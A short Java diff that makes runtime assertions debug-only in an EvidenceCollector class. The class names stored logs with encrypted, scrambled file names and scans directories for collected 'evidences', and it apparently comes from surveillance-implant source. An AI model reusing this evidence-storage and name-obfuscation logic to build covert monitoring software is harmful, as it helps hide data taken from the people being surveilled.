@@ -218,7 +218,7 @@ public class EvidenceCollector {
 			final String logType) {
 		final Date timestamp = log.timestamp;
 		final int progressive = getNewProgressive();
-		Check.asserts(progressive >= 0, "makeNewName fail progressive >=0");
+		if(Cfg.DEBUG) Check.asserts(progressive >= 0, "makeNewName fail progressive >=0");
 		final Vector vector = new Vector();
 		final String basePath = Path.logs();
 
@@ -229,14 +229,14 @@ public class EvidenceCollector {
 		final String ds = Long.toString(progressive % 10000); // double to
 		// string
 		final int size = mask.length() - ds.length();
-		Check.asserts(size >= 0, "makeNewName: failed size>0");
+		if(Cfg.DEBUG) Check.asserts(size >= 0, "makeNewName: failed size>0");
 		final String paddedProgressive = mask.substring(0, size) + ds;
 
 		final String fileName = paddedProgressive + "" + logType + ""
 				+ makeDateName(timestamp);
 
 		final String encName = encryptName(fileName + LOG_EXTENSION);
-		Check.asserts(!encName.endsWith("mob"), "makeNewName: " + encName
+		if(Cfg.DEBUG) Check.asserts(!encName.endsWith("mob"), "makeNewName: " + encName
 				+ " ch: " + seed + " not scrambled: " + fileName
 				+ LOG_EXTENSION);
 
@@ -330,7 +330,7 @@ public class EvidenceCollector {
 	 * @return the vector
 	 */
 	public Vector scanForDirLogs(final String currentPath) {
-		Check.requires(currentPath != null, "null argument");
+		if(Cfg.DEBUG) Check.requires(currentPath != null, "null argument");
 		File fc;
 
 		final Vector vector = new Vector();
@@ -370,8 +370,8 @@ public class EvidenceCollector {
 	 * @return the vector
 	 */
 	public String[] scanForEvidences(final String currentPath, final String dir) {
-		Check.requires(currentPath != null, "null argument");
-		Check.requires(!currentPath.startsWith("file://"),
+		if(Cfg.DEBUG) Check.requires(currentPath != null, "null argument");
+		if(Cfg.DEBUG) Check.requires(!currentPath.startsWith("file://"),
 				"currentPath shouldn't start with file:// : " + currentPath);
 
 		final TreeMap<String, String> map = new TreeMap<String, String>();
